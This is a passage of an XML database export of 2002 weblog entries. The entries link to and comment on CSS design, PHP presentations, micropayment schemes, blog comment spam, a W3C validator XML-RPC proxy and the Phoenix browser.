		<field name="created">2002-10-24 14:39:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">521</field>
		<field name="title">Tweaking sites for readability</field>
		<field name="slug">tweakingSitesForReadability</field>
		<field name="body">&lt;p&gt;Jeffrey Zeldman's new design &lt;a href=&quot;http://www.zeldman.com/daily/1002c.html#sniff&quot; title=&quot;24 October 2002&quot;&gt;continues to develop&lt;/a&gt;, but remains virtually unreadable on my monitor (without extensive tweaking of the settings). I'm not griping though as this was an ideal opportunity to play with Mozilla's DOM inspector. This handy tool allows you to load up a page and browser through the DOM of the page, tweaking as you go. More importantly, it lets you modify the CSS rules for each individual element. It took a matter of seconds to fire up the inspector, browse down to the CSS rules for the body element and change the colour setting to rgb(255, 255, 255) - not particularly pretty but a lot more readable on this monitor than the default black. Of course, a bookmarklet to do the same thing would be much more convenient...&lt;/p&gt;</field>
		<field name="created">2002-10-24 15:10:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">522</field>
		<field name="title">Micropayments on the way</field>
		<field name="slug">micropaymentsOnTheWay</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.saila.com/columns/lcky/2002_10_20_archive.shtml#83468655&quot; title=&quot;Thursday, October 24, 2002&quot;&gt;Craig Saila&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;In the &quot;Wouldn't it Be Great&quot; category: Vin Crosbie, in a posting to online-news, says he’s been hearing rumours that next month MasterCard and Visa will start handling small (micro?) transactions online.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I've been saying (offline) for a long time that what the web really needs is a micropayment system backed by a huge (and trustworthy) financial company. This could be just the break the micropayment movement needs. I'm still slightly worried by the implementation details; for micropayments to work there needs to be a single-sign-in mechanism of some kind and anything like that is likely to have all kinds of security and privacy concerns. Then again, the Amazon tip-jar / honor box model has been working pretty well since its introduction. It'll be interesting to see where this goes.&lt;/p&gt;</field>
		<field name="created">2002-10-24 21:50:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">523</field>
		<field name="title">Short sighted management</field>
		<field name="slug">shortSightedManagement</field>
		<field name="body">&lt;p&gt;Bob Cringely: &lt;a href=&quot;http://www.pbs.org/cringely/pulpit/pulpit20021024.html&quot;&gt;The Case Against Professionalism&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.pbs.org/cringely/pulpit/pulpit20021024.html&quot;&gt;&lt;p&gt;Here is a scene that happens at some point in almost every young company. The founder/CEO/technical visionary meets with his board and finds him or herself out of a job. How could this happen? Well, the company has grown to the point where the board feels that &quot;professional management&quot; is required, so they are bringing in a new management team. The new team is composed of old friends and classmates of the board, and the new team costs five to 10 times as much, but that's okay because the company is &quot;hiring for growth.&quot; This new team cuts staff, cuts costs and outsources everything that can be outsourced, with the result that earnings are improved and the stock goes up or the company makes itself look better for an Initial Public Offering. The professional managers get big bonuses, they exercise mountains of stock options, sell those option shares, then go on to some other, even bigger, job having &quot;saved&quot; the company, which then stagnates, goes into a slow decline, and is eventually acquired by a competitor.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is a scary article - it demonstrates how short sighted modern management techniques are, and how they benefit those involved at the expense of the long term future of the company. It doesn't help my geeky distrust of management much either.&lt;/p&gt;</field>
		<field name="created">2002-10-25 12:58:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">524</field>
		<field name="title">Googlism</field>
		<field name="slug">googlism</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.googlism.com/&quot;&gt;Googlism&lt;/a&gt; knows too much:&lt;/p&gt;

&lt;blockquote&gt;&lt;pre&gt;
simon willison is becoming more and more obvious
simon willison is an undergrad at the university of bath
&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;Spotted on &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000269.html#000269&quot; title=&quot;My Googlism&quot;&gt;Jeremy Zawodny's blog&lt;/a&gt;. As a side note, the site uses the wrong form method - it uses POST when it should be using GET. GET would allow people to bookmark their queries.&lt;/p&gt;</field>
		<field name="created">2002-10-27 00:26:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">525</field>
		<field name="title">PythonCard scriptlets</field>
		<field name="slug">scriptletsAndPythonCard</field>
		<field name="body">&lt;p&gt;Kevin Altis on &lt;a href=&quot;http://radio.weblogs.com/0102677/2002/10/21.html#a20&quot; title=&quot;Kevin Altis: Monday, October 21, 2002&quot;&gt;scripting applications&lt;/a&gt; written in PythonCard:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0102677/2002/10/21.html#a20&quot;&gt;&lt;p&gt;
The entire object model of a PythonCard application is exposed, so if an app doesn't have the feature you want, you can probably extend it with a short &quot;macro&quot; in Python. All scripts are run in the shell, so they share the shell namespace and thus scripts can share variables since the namespace doesn't go away until the application is closed.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Kevin calls these scripts &quot;scriptlets&quot; and has posted an &lt;a href=&quot;http://radio.weblogs.com/0102677/categories/pythoncard/2002/05/10.html&quot; title=&quot;codeEditor&quot;&gt;example scriptlet&lt;/a&gt; that can insert the current date and time straight in to any text file opened with the PythonCard codeEditor.&lt;/p&gt;

&lt;p&gt;Sam Ruby was recently quoted as &lt;a href=&quot;http://weblog.infoworld.com/udell/2002/10/07.html#a461&quot; title=&quot;Java, C#, Python, and Ruby&quot;&gt;stating the following&lt;/a&gt; over on Jon Udell's blog:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblog.infoworld.com/udell/2002/10/07.html#a461&quot;&gt;&lt;p&gt;
While Java and C# battle over who is the rightful successor to C++, it is quite possible that a language like Python (or, dare I say it, Ruby) will ultimately be the one that wins out.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;This is an interesting train of thought. Scripting languages such as Python undeniably lead to faster development times (no compile cycle, less book keeping syntax to worry about) and as computers continue to get faster and cheaper the overhead associated with these languages becomes less and less important. Kevin's concept of an application with an exposed object model that can be tweaked by the user is a powerful idea, and one that could bring real benefits; Python is not a difficult language to program in, and applications which can be scripted easily can become very popular (just look at the &lt;a href=&quot;http://www.mirc.com/&quot;&gt;mIRC&lt;/a&gt; community for an example of that). Unfortunately the ability to script an application also leads to inherent security flaws, as have been seen with VBScript and Microsoft Office - although in the case of Office most of the problems stem from the ability to add macros to individual documents (there are surprisingly few mIRC security alerts despite the in built scripting engine).&lt;/p&gt;</field>
		<field name="created">2002-10-27 10:58:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">526</field>
		<field name="title">Shiny</field>
		<field name="slug">shiny</field>
		<field name="body">&lt;p&gt;It's probably a good idea to keep axes and Jack Daniels away from &lt;a href=&quot;http://www.kottke.org/02/10/021027all_work_and.html&quot; title=&quot;All work and no play makes Jason a dull boy&quot;&gt;Jason Kottke&lt;/a&gt; for the next few days...&lt;/p&gt;</field>
		<field name="created">2002-10-27 11:00:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">527</field>
		<field name="title">Tidakada redesign</field>
		<field name="slug">tidakadaRedesign</field>
		<field name="body">&lt;p&gt;tidakada has &lt;a href=&quot;http://tidakada.com/archives/p/1927/more/1/c/1&quot; title=&quot;it’s a redesign!&quot;&gt;redesigned&lt;/a&gt;, with a funky new 4 column CSS layout and a brand new blog o' links.&lt;/p&gt;</field>
		<field name="created">2002-10-27 14:57:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">528</field>
		<field name="title">Comment spammers</field>
		<field name="slug">commentSpammers</field>
		<field name="body">&lt;p&gt;I suppose it was only a matter of time. Phil Ringnalda &lt;a href=&quot;http://philringnalda.com/archives/002371.php&quot; title=&quot;Comment spam alert&quot;&gt;reports&lt;/a&gt; on a spam attack on his blog in which a spammer used a script to systematically spam the comments section of every entry, using a piece of code targetted at Moveable Type. Phil cut the spammer off after only 120 spams (and used mySQL to wipe out the spam in a few seconds) but this is still a very worrying precedent. Back in August I &lt;a href=&quot;http://simon.incutio.com/archive/2002/08/14/#bulletinBoardSpam&quot; title=&quot;Bulletin Board Spam&quot;&gt;blogged&lt;/a&gt; a spamming company that targetted simple web based bulletin boards like WWWBoard - it looks like they (or someone like them) have discovered blogs.&lt;/p&gt;

&lt;p&gt;I really hope this doesn't lead to bloggers insisting on registration before people can post comments. Phil's suggestion of built in flooding detection looks like the best solution for the moment, and I'm sure Moveable Type will be quick to implement it (as always).&lt;/p&gt;</field>
		<field name="created">2002-10-28 07:31:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">529</field>
		<field name="title">Validator web service please</field>
		<field name="slug">validatorWebServicePlease</field>
		<field name="body">&lt;p&gt;Scott Andrew &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_10#a000447&quot; title=&quot;Valid Progress&quot;&gt;calls&lt;/a&gt; for an &lt;acronym title=&quot;XML Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; or &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt; interface to the &lt;a href=&quot;http://validator.w3.org:8001/&quot;&gt;new W3C HTML Validator&lt;/a&gt; (currently in beta). I've been hoping for something for this like ages - if the W3C don't do it it would be great if someone else set this up (the validator is open source but the bandwidth required for such an undertaking would probably be pretty high).&lt;/p&gt;</field>
		<field name="created">2002-10-28 11:31:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">530</field>
		<field name="title">Cache-22</field>
		<field name="slug">cache22</field>
		<field name="body">&lt;p&gt;I haven't been checking my referrer logs recently, so it was a nice surprise to see that Richard from Incutio has finished redesigning &lt;a href=&quot;http://www.cache-22.co.uk/&quot;&gt;his blog&lt;/a&gt; and is now back to updating it frequently. He also &lt;a href=&quot;http://www.cache-22.co.uk/comments/blog/9/&quot; title=&quot;Pingback&quot;&gt;has Pingback&lt;/a&gt; (implemented using &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;IXR&lt;/a&gt;) and is pinging &lt;a href=&quot;http://blo.gs/&quot;&gt;blo.gs&lt;/a&gt; when he updates.&lt;/p&gt;</field>
		<field name="created">2002-10-28 11:41:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">531</field>
		<field name="title">Apple Internet Developer</field>
		<field name="slug">appleInternetDeveloper</field>
		<field name="body">&lt;p&gt;Apple have an excellent site called &lt;a href=&quot;http://developer.apple.com/internet/&quot;&gt;Internet Developer&lt;/a&gt;, with articles covering a wide range of web development topics from HTML and CSS right through to &lt;a href=&quot;http://developer.apple.com/internet/webservices/soapphp.html&quot;&gt;Using SOAP with PHP&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-10-28 11:54:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">532</field>
		<field name="title">W3C validator web service</field>
		<field name="slug">w3cValidatorWebService</field>
		<field name="body">&lt;p&gt;Earlier today I mentioned how useful a web service interface to the new W3C validator would be. &lt;a href=&quot;http://tom.me.uk/&quot;&gt;Tom Gilder&lt;/a&gt; pointed out in the &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/validatorWebServicePlease#comments&quot;&gt;comments&lt;/a&gt; that the validator now has an XML interface:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://validator.w3.org:8001/check?uri=http://simon.incutio.com/&amp;amp;output=xml&quot;&gt;http://validator.w3.org:8001/check?uri=http://simon.incutio.com/&amp;amp;output=xml&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I had a play around and the XML interface works pretty well, although it still has a few quirks (hardly surprising for a beta product) - the information on whether or not the page is valid is passed back in an HTTP header (&lt;code&gt;X-W3X-Validator-Status&lt;/code&gt;) and if the page is unreachable or forbiden the interface returns an XHTML document. Still, it's enough to play with, and as a demonstration of the flexibility of this new tool I've put together an XML-RPC proxy for the service:&lt;/p&gt;

&lt;pre&gt;
Server : scripts.incutio.com
Port   : 80
Path   : /xmlrpc/validator/validate.php
Method : w3c.validate(url)
&lt;/pre&gt;

&lt;p&gt;The web service accepts a URL and returns an XML-RPC struct containing the results of validation. The most important field of the struct is &lt;code&gt;status&lt;/code&gt;, which will be set to Valid, Invalid or Failed depending on whether or not the page passed the test (Failed means the validator threw back an XHTML page rather than XML, and can generally be assumed to mean the page has failed validation for some reason). The other fields of the struct contain information returned by the validator, including an array of warnings and an array of error messages if any were returned. The structure of the struct can be best understood by comparing it to the XML returned by the standard XML interface.&lt;/p&gt;

&lt;p&gt;The source code for the web service is available in the following files:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/validator/validate.php.txt&quot;&gt;validate.php&lt;/a&gt; - the web service, implemented using &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;IXR&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/validator/SnoopyPlus.class.php.txt&quot;&gt;SnoopyPlus.class.php&lt;/a&gt; - an extension of the &lt;a href=&quot;http://snoopy.sourceforge.net/&quot;&gt;Snoopy&lt;/a&gt; web client class&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/validator/classes.inc.php.txt&quot;&gt;classes.inc.php&lt;/a&gt; - various support classes, including the main XML parsing class&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://scripts.incutio.com/xmlrpc/validator/W3cValidator.class.php.txt&quot;&gt;W3cValidator.class.php&lt;/a&gt; - a class implementing the main logic of the web service (can be reused on its own)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I've also coded in a 100 queries / IP / hour limit, in the unlikely event that the service gets a large amount of traffic. I should stress that this is a beta web service built on top of a beta validator - it may stop working at any time, so it should not be considered suitable for production use. If you want to use it heavily feel free to download the source and set it up on your server, but remember that the W3C beta validator may well change it's XML output rendering the web service useless.&lt;/p&gt;</field>
		<field name="created">2002-10-28 15:47:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">533</field>
		<field name="title">PHP at Yahoo</field>
		<field name="slug">phpAtYahoo</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://public.yahoo.com/~radwin/talks/yahoo-phpcon2002.htm&quot;&gt;Making the Case for PHP at Yahoo!&lt;/a&gt; (via &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000279.html#000279&quot; title=&quot;PHPCon 2002: Making the Case for PHP at Yahoo!&quot;&gt;Jeremy Zawodny&lt;/a&gt;) looks like it was a great presentation. The slides include the reasons PHP was chosen over ASP, ColdFusion, JSP and Perl and has some interesting details on the history of Yahoo's server side technologies. Jeremy has extensive coverage of PHPcon so be sure to flick through some of his recent entries while you are there.&lt;/p&gt;</field>
		<field name="created">2002-10-29 01:30:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">534</field>
		<field name="title">Software Engineering practises for PHP</field>
		<field name="slug">softwareEngineeringForPHP</field>
		<field name="body">&lt;p&gt;Scott Johnson's presentation on &lt;a href=&quot;http://www.fuzzygroup.com/phpcon2002/engineering/index_files/frame.htm&quot;&gt;Software Engineering Practices for Large Scale PHP Projects&lt;/a&gt; is fantastic - lots of excellent practical advice for professional development with PHP. It's a shame the presentation slides require Internet Explorer (due to being exported from Power Point) but it was more than worth firing up IE to view them.&lt;/p&gt;</field>
		<field name="created">2002-10-29 02:07:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">535</field>
		<field name="title">Cashets</field>
		<field name="slug">cachets</field>
		<field name="body">&lt;p&gt;Roll on the &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/24/#micropaymentsOnTheWay&quot; title=&quot;Micropayments on the way&quot;&gt;micropayment revolution&lt;/a&gt;! &lt;a href=&quot;http://cashets.com/&quot;&gt;Cashets&lt;/a&gt; are &lt;q cite=&quot;http://cashets.com/&quot;&gt;designed specifically for the small purchases - $1 (or less) - that you ordinarily can't make on the Internet because sellers have a minimum&lt;/q&gt;. The smallest amount you can charge using the system is 2 cents, of which 1 cent will go to Cashets and 1 cent will go to you, the seller. The 1 cent is a flat rate for sales up the a dollar, then it's 2 cents for sales up to 2 dollars and so on up the maxiumum charge of 5 dollars. The company is owned by MasterCard founder Michael Phillips and two unnamed partners who are &quot;computer professionals&quot;. The site is atrocious (the text on the front page is a big gif with no alt text ffs) but the business model looks like it could just be the thing small-to-medium web sites have been waiting for.&lt;/p&gt;</field>
		<field name="created">2002-10-29 16:11:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">536</field>
		<field name="title">Realistic internet simulator</field>
		<field name="slug">realisticInternetSimulator</field>
		<field name="body">&lt;p&gt;Hehe, &lt;a href=&quot;http://www.b3ta.com/realistic-internet-simulator/&quot; title=&quot;Realistic Internet Simulator&quot;&gt;this&lt;/a&gt; reminded me why I don't use IE any more :)&lt;/p&gt;</field>
		<field name="created">2002-10-29 16:37:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">537</field>
		<field name="title">Validator warning</field>
		<field name="slug">validatorWarning</field>
		<field name="body">&lt;p&gt;As Scott Andrew has &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_10#a000447&quot; title=&quot;Valid Progress&quot;&gt;noted&lt;/a&gt;, the W3C's &lt;a href=&quot;http://validator.w3.org:8001/&quot;&gt;beta validator&lt;/a&gt; is now returning the following warning as part of it's XML output:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.scottandrew.com/weblog/2002_10#a000447&quot;&gt;&lt;p&gt;
This interface is highly experimental and the output *will* change -- probably even several times -- before finished. Do *not* rely on it!
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;As I said in my &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/28/#w3cValidatorWebService&quot;&gt;post&lt;/a&gt; announcing the web service interface, it may stop working at any time. Treat it as an experiment / proof-of-concept and you won't get burnt if/when it breaks.&lt;/p&gt;</field>
		<field name="created">2002-10-29 17:16:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">538</field>
		<field name="title">Comment spam and game theory</field>
		<field name="slug">commentSpamAndGameTheory</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has posted &lt;a href=&quot;http://diveintomark.org/archives/2002/10/29.html#club_vs_lojack_solutions&quot; title=&quot;Club vs. Lojack solutions&quot;&gt;another&lt;/a&gt; of his signature in depth explanations, this time concerning the recent worries over blog comment spam. He points out that all of the proposed solutions are Club solutions, not Lojack solutions, meaning they &lt;q cite=&quot;http://diveintomark.org/archives/2002/10/29.html#club_vs_lojack_solutions&quot;&gt;directly help those who implement them, possibly at the expense of others who do not&lt;/q&gt;. He then ties this in to game theory and the classic &lt;a href=&quot;http://www.wikipedia.org/wiki/Prisoners_dilemma&quot; title=&quot;Wikipeda: Prioner&amp;apos;s dilemma&quot;&gt;Prioner's Dilemma&lt;/a&gt; problem.&lt;/p&gt;</field>
		<field name="created">2002-10-29 23:42:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">539</field>
		<field name="title">ebook rants</field>
		<field name="slug">ebookRants</field>
		<field name="body">&lt;p&gt;Dorothea has posted &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2002_10_27.html#e001036&quot; title=&quot;Analogies&quot;&gt;two&lt;/a&gt; &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2002_10_27.html#e001035&quot; title=&quot;PDF, OEB, and memes&quot;&gt;more&lt;/a&gt; excellent rants on the subject of ebooks, archiving and the importance of a single standard for master files (as opposed to a single standard for end user files which is a lot less important).&lt;/p&gt;</field>
		<field name="created">2002-10-29 23:54:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">540</field>
		<field name="title">Disadvantages of TMTOWTDI</field>
		<field name="slug">disadvantagesOfTMTOWTDI</field>
		<field name="body">&lt;p&gt;Slashdot have a story up linking to the Yahoo PHP presentation (mentioned earlier). The comments are pretty much an all out lanuage holy war, but the &lt;a href=&quot;http://developers.slashdot.org/comments.pl?sid=43701&amp;amp;cid=4560310&quot; title=&quot;Because it costs too much to use Perl&quot;&gt;following comment&lt;/a&gt; explaining why Perl's &quot;There's more than one way to do it&quot; is a disadvantage when trying to write maintainable code caught my eye:&lt;/p&gt;

&lt;blockquote cite=&quot;http://developers.slashdot.org/comments.pl?sid=43701&amp;amp;cid=4560310&quot;&gt;&lt;p&gt;
As they pointed out &quot;there's more than one way to do things&quot;. For maintenance programming, this means that you have to know every way of doing things, or you aren't going to be able to read all the code.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-10-30 01:32:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">541</field>
		<field name="title">Trade by Bumbers</field>
		<field name="slug">tradeByNumbers</field>
		<field name="body">&lt;p&gt;Craig Saila has &lt;a href=&quot;http://www.saila.com/columns/lcky/2002_10_27_archive.shtml#83672469&quot; title=&quot;&quot;&gt;launched&lt;/a&gt; his latest project, &lt;a href=&quot;http://magazine.globeinvestor.com/&quot;&gt;Trade by Numbers&lt;/a&gt;, which uses valid code and (Netscape 4 friendly) CSS for layout. The CSS code is worth looking over for the intelligent use of browser hacks, all commented. Writing Netscape 4 compatible CSS is still something of a mysterious art form, but documentation is steadily increasing with useful resources such as Craig's list of &lt;a href=&quot;http://www.saila.com/usage/layouts/nn4-layouts.shtml&quot;&gt;NS4 CSS layouts&lt;/a&gt; and Mark Newhouse's &lt;a href=&quot;http://realworldstyle.com/&quot;&gt;Real World Style&lt;/a&gt;. The tips on NS4 compatibility in &lt;a href=&quot;http://www.glasshaus.com/bookInfo.asp?bookId=59&quot;&gt;Cascading Style Sheets: Separating Content from Presentation&lt;/a&gt; are also invaluable for anyone who is serious about CSS but still has to support legacy browsers. I have yet to produce a NS4 compatible CSS layout but I'm beginning to realise that it's not quite as impossible as many people make out.&lt;/p&gt;</field>
		<field name="created">2002-10-30 01:46:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">542</field>
		<field name="title">CSS roundup</field>
		<field name="slug">cssRoundup</field>
		<field name="body">&lt;p&gt;Jeffrey Zeldman has resolved his niggling CSS bugs, and posted &lt;a href=&quot;http://www.zeldman.com/essentials/1.shtml#workarounds&quot;&gt;the workarounds&lt;/a&gt; for all to see. &lt;q cite=&quot;http://www.zeldman.com/daily/1002d.shtml#up&quot;&gt;What's amazing and unprecedented about CSS layout is that it's completely abstracted from the data it presents.&lt;/q&gt; he muses. Dorothea Salo &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2002_10_27.html#e001043&quot; title=&quot;Abstraction&quot;&gt;points out&lt;/a&gt; that the publishing industry has been doing this for hundreds of years. Meanwhile, Todd Dominey has &lt;a href=&quot;http://whatdoiknow.org/archives/000505.php&quot; title=&quot;CSS Overhaul&quot;&gt;overhauled his CSS&lt;/a&gt; to get rid of the javascript browser detection and &lt;a href=&quot;http://diveintomark.org/archives/2002/10/31.html#halloween_css&quot; title=&quot;Halloween CSS&quot;&gt;Mark Pilgrim&lt;/a&gt; and &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_10#a000452&quot; title=&quot;Boo To You, Too&quot;&gt;Scott Andrew&lt;/a&gt; have both posted funky Halloween CSS makeovers.&lt;/p&gt;</field>
		<field name="created">2002-10-31 20:36:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">543</field>
		<field name="title">RSS validator uses my CSS</field>
		<field name="slug">rssValidatorCss</field>
		<field name="body">&lt;p&gt;I just noticed that the &lt;a href=&quot;http://feeds.archive.org/validator/check?url=http%3A%2F%2Fwww.computerworld.com%2Fnews%2Fxml%2F10%2F0%2C5009%2C%2C00.xml&quot;&gt;RSS validator&lt;/a&gt; is using my &lt;a href=&quot;http://development.incutio.com/simon/numbered-code-experiment.html&quot; title=&quot;Numbered Code Listing Experiment&quot;&gt;numbered code listing&lt;/a&gt; CSS experiment :)&lt;/p&gt;</field>
		<field name="created">2002-10-31 20:41:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">544</field>
		<field name="title">Pull quotes and page titles</field>
		<field name="slug">pullQuotesAndPageTitles</field>
		<field name="body">&lt;p&gt;Adrian Holovaty has followed up his discussion of &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/10/25/1742&quot;&gt;page titles on news article pages&lt;/a&gt; with a look at the oft-abused &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/10/31/1234&quot; title=&quot;Pull-quotes on Web pages&quot;&gt;pull-quote&lt;/a&gt;. Adrian points out how pull quotes can lead to poor accessibility for text browsers and screen readers, and suggests that providing a &quot;skip quote&quot; link could help improve things. Adrian's comments section attracts a number of professional web deverlopers working on all kinds of news sites so the discussion is likely to be well worth watching over the next few days.&lt;/p&gt;</field>
		<field name="created">2002-10-31 20:47:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">545</field>
		<field name="title">Linux Gazette Python articles</field>
		<field name="slug">linuxGazettePythonArticles</field>
		<field name="body">&lt;p&gt;Linux Gazette has a couple of interesting Python articles at the moment. &lt;a href=&quot;http://www.linuxgazette.com/issue83/evans.html&quot;&gt;Dealing with User Input in Python&lt;/a&gt; is a beginners guide to validating user input, while &lt;a href=&quot;http://www.linuxgazette.com/issue80/nielsen.html&quot;&gt;Pl/Python and Cursors in Pl/Pgsql for PostgreSQL&lt;/a&gt; explains how Python can be used to write stored procedures in PostgreSQL.&lt;/p&gt;</field>
		<field name="created">2002-10-31 20:51:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">546</field>
		<field name="title">Phoenix usurps Mozilla</field>
		<field name="slug">phoenixUsurpsMozilla</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.mozilla.org/projects/phoenix/phoenix-release-notes.html&quot;&gt;Phoenix 0.4 is out&lt;/a&gt;, and it's so good it has replaced Mozilla as my default browser. &lt;a href=&quot;http://www.mozilla.org/projects/ui/accessibility/typeaheadfind.html&quot;&gt;Type Ahead Find&lt;/a&gt; makes browsing links and searching pages a dream (I've really come round to it after &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/13/#mozilla12alpha&quot;&gt;my initial whinge&lt;/a&gt;) but my favourite feature is the Google &quot;I'm Feeling Lucky&quot; integration built right in to the address bar. Type in a single word and Phoenix will try word.com (and possible word.org/word.net) before passing it on to Google and redirecting to the first search result. Type in multiple words and I'm Feeling Lucky is invoked straight away. Normal Google searches can be run from the smaller Google field to the right of the address bar. It all adds up to a virtually seamless browsing experience, especially now that I've memorised the Google URLs of most of my favourite sites.&lt;/p&gt;</field>
		<field name="created">2002-10-31 21:02:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">547</field>
		<field name="title">Doc's thoughts on Linux Lunacy</field>
		<field name="slug">docsThoughtsOnLinuxLunacy</field>
		<field name="body">&lt;p&gt;Doc Searls is back from the Linux Lunacy cruise, and has been talking about the future of the software industry in &lt;a href=&quot;http://www.linuxjournal.com/article.php?sid=6414&quot;&gt;What I learned on Linux Lunacy&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.linuxjournal.com/article.php?sid=6414&quot;&gt;&lt;p&gt;
That's over, and it's not because a pile of overfunded dot-com fantasies crashed to the ground. It's over because the market doesn't want it any more. The market wants something more like professional services--architects, designers and builders. Good businesses all, but not the kind that are &quot;venture scale&quot;, as they say.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I think this is the classic business case for open source software - pay software engineers to buld custom solutions from freely available (open source) components. The engineers make a good living, the company gets good software and hopefully some more open source material is fed back to the community as a result. Is the market really heading that way? A lot of very smart people seem to think so. The next few years could be very interesting indeed.&lt;/p&gt;</field>
		<field name="created">2002-11-01 00:59:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">548</field>
		<field name="title">JSP bits and pieces</field>
		<field name="slug">jspBitsAndPieces</field>
		<field name="body">&lt;p&gt;I've been reading up on the Jakarta Struts &lt;acronym title=&quot;Model View Controller&quot;&gt;MVC&lt;/acronym&gt; framework, courtesy of &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000357.html&quot; title=&quot;JSPs, the MVC model, and Struts&quot;&gt;Simon Brunning&lt;/a&gt;. &lt;a href=&quot;http://www-106.ibm.com/developerworks/java/library/j-struts/index.html#h1&quot;&gt;Struts, an open-source MVC implementation&lt;/a&gt; is a great starting point, and the ONJava &lt;a href=&quot;http://www.onjava.com/onjava/jsp_servlets/&quot;&gt;JSP/JSTL series&lt;/a&gt; (also found &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000512.html#000512&quot; title=&quot;O&amp;apos;Reilly Struts article&quot;&gt;via Simon&lt;/a&gt;) were very informative as well.&lt;/p&gt;</field>
		<field name="created">2002-11-01 14:56:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">549</field>
		<field name="title">Button games</field>
		<field name="slug">buttonGames</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://kisrael.com/features/gb.html&quot;&gt;Javascript form button games&lt;/a&gt; (&lt;a href=&quot;http://www.camworld.com/journal/2002/11/#01&quot; title=&quot;Game Button Arcade&quot;&gt;via CamWorld&lt;/a&gt;). These have to be seen to be believed.&lt;/p&gt;</field>
		<field name="created">2002-11-01 19:28:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">550</field>
		<field name="title">Excellent introduction to XSLT</field>
		<field name="slug">excellentIntroductionToXslt</field>
